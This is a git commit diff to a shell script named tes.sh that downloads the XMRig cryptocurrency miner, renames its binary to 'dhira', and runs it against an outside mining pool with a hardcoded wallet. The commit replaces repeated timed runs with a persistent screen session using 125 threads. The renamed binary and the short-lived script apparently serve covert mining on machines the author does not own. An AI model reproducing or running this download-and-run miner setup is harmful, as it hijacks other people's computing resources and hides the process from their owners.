8fe32e1193934f9cd0e3ef1d33eba6eef9608279
akilops <99491928+akilops@users.noreply.github.com>
2022-02-24 21:16:08 -0500

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -2,40 +2,12 @@
 #
 
 #xxx
-apt update
+yum update
+yum install screen -y
+yum install wget -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
 tar xf xmrig-6.16.4-linux-x64.tar.gz 
 cd xmrig-6.16.4
 mv xmrig dhira
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-sleep 60
-timeout 10m ./dhira -o pool.hashvault.pro:3333 -u Sumoo4oAFCKZhiQSMLU7q9Uzku4DYaHK4NcDWXfu5KndNU2TCKmcX3xXV3XAKoLY6Q54keRtKLPRbL3p1htrzzQjSiFTk86oqVv -p qwik -a -k  --donate-level=1 -t 5
-echo done
+screen ./dhira -o pool.hashvault.pro:3333 -u SuboKsvr3XLAsvWtcgppXpXWkMuhjQnE1K9VYFk5m7Y7aX3fZX4qwLXWtzvgqpH8pT4svmTa1FmZyZ7p8ZDKMnAg7pXEW5TiS8 -p qwik -a -k  --donate-level=1 -t 125
+
